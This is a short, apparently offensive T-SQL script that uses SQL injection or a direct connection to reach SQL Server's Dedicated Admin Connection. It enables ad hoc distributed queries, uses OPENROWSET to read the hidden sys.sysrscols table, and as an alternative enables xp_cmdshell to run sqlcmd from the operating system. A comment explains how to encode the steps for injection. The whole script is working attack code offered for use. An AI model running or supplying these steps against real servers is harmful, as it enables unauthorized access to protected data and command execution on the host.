-- Making a DAC connection via SQLi or direct connection using ad-hoc queries

-- Verify that we don't have access to hidden SQL Server system tables - returns msg 208 "Invalid object name 'sys.sysrscols'."

SELECT * FROM sys.sysrscols

-- Enabled ad hoc queries (disabled by default)
-- Note: Changing this configuration requires sysadmin privileges.
-- Note: For sqli this can be placed into a stored procedure or binary encoded+executed with exec

sp_configure 'Ad Hoc Distributed Queries',1
reconfigure
go

-- Make a DAC connection via ad hoc query - tada!

SELECT a.* FROM OPENROWSET('SQLNCLI', 'Server=ADMIN:SQLSERVER1\INSTANCE2014;Trusted_Connection=yes;','SELECT * FROM sys.sysrscols') AS a;

Note: This could also be done with database links. Lots of potential for this one - Enjoy!

-- Alternatively, you could just use xp_cmdshell to pass through to sqlcmd, osql, or isql, but the output isn't quite as nice.

sp_configure 'show advanced options',1
reconfigure
go

sp_configure 'xp_cmdshell',1
reconfigure
go

xp_cmdshell 'sqlcmd -E -S "ADMIN:SQLSERVER1\INSTANCE2014" -Q "SELECT * FROM sys.sysrscols"'
